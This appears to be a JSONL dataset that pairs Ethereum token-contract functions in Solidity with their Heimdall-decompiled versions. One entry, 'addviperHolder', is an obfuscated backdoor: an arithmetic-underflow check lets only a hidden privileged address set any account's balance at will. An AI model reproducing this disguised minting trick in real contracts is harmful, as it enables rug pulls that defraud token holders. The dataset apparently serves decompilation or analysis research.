{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function set_New_Router_Address(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_Address(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        uniswapV2Router = (address(arg0) * 0x01) | (uint96(uniswapV2Router));\n    }"}
{"contract_address": "0xdcb0A4559562a8854074Aeaf47B9549aD1eC1163", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"Only one transfer per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_d / 0x01))), \"Only one transfer per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_e / 0x01))), \"Only one transfer per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_h = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_e / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_h == ((arg1 * store_h) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_h) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x12;\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_e / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_h) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_h) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_h) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_h) / 0x64);\n        uint256 var_k = (arg1 * store_h) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_h) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_e = 0x40 + var_e;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_h) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_t = var_e.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_h) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((arg1 * store_h) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_m) {\n            if (arg1 - 0) {\n            }\n            if (arg1 - 0) {\n            }\n            require(store_f > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x19;\n        var_g = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_d / 0x01))) {\n            if (address(arg0) == (address(store_d / 0x01))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEea644890623CdfBD648027cbf819A3C8e48C924", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"BaseRfiToken: approve to the zero address\");\n        require(address(arg0), \"BaseRfiToken: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x1a;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x42617365526669546f6b656e3a20617070726f766520746f20746865207a6572;\n        var_g = 0x6f20616464726573730000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2b;\n        var_f = 0x42617365526669546f6b656e3a20617070726f76652066726f6d20746865207a;\n        var_g = 0x65726f2061646472657373000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8EF34AD921FF8e7D465210EbBe3029fB7B2dd294", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
